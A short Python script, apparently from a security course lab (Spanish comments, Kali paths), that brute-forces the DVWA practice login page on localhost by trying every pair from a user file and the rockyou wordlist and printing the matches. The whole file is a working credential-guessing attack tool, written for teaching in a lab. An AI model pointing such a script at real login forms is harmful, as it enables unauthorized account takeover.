import requests
import time

# Ubicación y cookies del formulario
url = 'http://127.0.0.1/vulnerabilities/brute/'
headers = {
    'Cookie': 'security=low; PHPSESSID=ddn1cf6daoam2n2o5foi4sfd54'
}

def brute_force(user_file, pass_file):
    valid_credentials = []
    start_time = time.time()  # Tiempo de inicio
    
    with open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
        users = uf.read().splitlines()
        passwords = pf.read().splitlines()

        for user in users:
            for password in passwords:
                data = {
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                response = requests.get(url, headers=headers, params=data)
                
                if 'Welcome to the password protected area' in response.text:
                    print(f'Coincide: {user}:{password}')
                    valid_credentials.append((user, password))
                else:
                    print(f'Falla {user}:{password}')
    
    end_time = time.time()  # Tiempo de fin
    tiempo_total = end_time - start_time  # Tiempo transcurrido

    # Imprimir todas las credenciales válidas encontradas al final
    print('\nPares Validos:')
    for user, password in valid_credentials:
        print(f'{user}:{password}')

    print(f'\nTiempo total: {tiempo_total:.2f} segundos')

# Ejecuta el ataque
brute_force('/home/kali/cripto/lab2/user.txt', '/usr/share/wordlists/rockyou_shortened.txt')
